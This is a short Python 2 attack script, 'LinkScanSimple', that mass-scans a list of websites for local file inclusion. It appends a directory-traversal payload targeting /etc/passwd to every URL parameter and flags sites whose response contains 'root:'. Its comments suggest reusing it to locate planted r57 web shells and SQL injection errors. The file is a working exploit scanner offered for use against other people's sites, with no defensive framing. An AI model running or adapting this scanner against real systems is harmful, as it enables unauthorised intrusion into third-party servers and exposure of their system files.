#!/usr/bin/python
#LinkScanSimple will take a list of sites and
#add an extension after the = then search the 
#source for a match you choose. 

#For an LFI scan I use "root:" but for a shell location
#I would choose the shell title (r57shell). For SQL
#you can choose a common sql error.

import sys, re, urllib2, sets, socket
socket.setdefaulttimeout(5)

#---------------------------------------------------------
#Edit what you want added to the address.
EXT = "../../../../../../../../../../../../etc/passwd" 

#Edit what you want to search for.
MATCH = "root:"
#---------------------------------------------------------

def parse_urls(links):
	urls = []
	for link in links: 
		num = link.count("=")
		if num > 0:
			for x in xrange(num):
				link = link.rsplit("=",x+1)[0]+"="
				urls.append(link+EXT)
	urls = list(sets.Set(urls))
	return urls
 
def test(host): 
 	print "[+] Testing:",host.replace(EXT,"")
	try: 
		source = urllib2.urlopen(host).read() 
		if re.search(MATCH, source): 
			print "[+] Found:",host
		else: 
			print "[-] Not Vuln." 
	except:
		pass 
 

print "\n\t   d3hydr8[at]gmail[dot]com LinkScanSimple v1.0"
print "\t-------------------------------------------------\n"
			
if len(sys.argv) != 2:
	print "Usage : ./linkscan.py <site_list>"
	print "Ex: ./linkscan.py sites.txt\n"
	sys.exit(1)
	
try:
	sites = open(sys.argv[1], "r").readlines()
except(IOError): 
  	print "Error: Check your site list path\n"
  	sys.exit(1)

print "[+] Loaded:",len(sites),"sites"
urls = parse_urls(sites)
print "[+] Links Found:",len(urls)
for url in urls: 
	try:
		test(url.replace("\n",""))
	except(KeyboardInterrupt):
		pass
print "\n[-] Scan Complete\n"
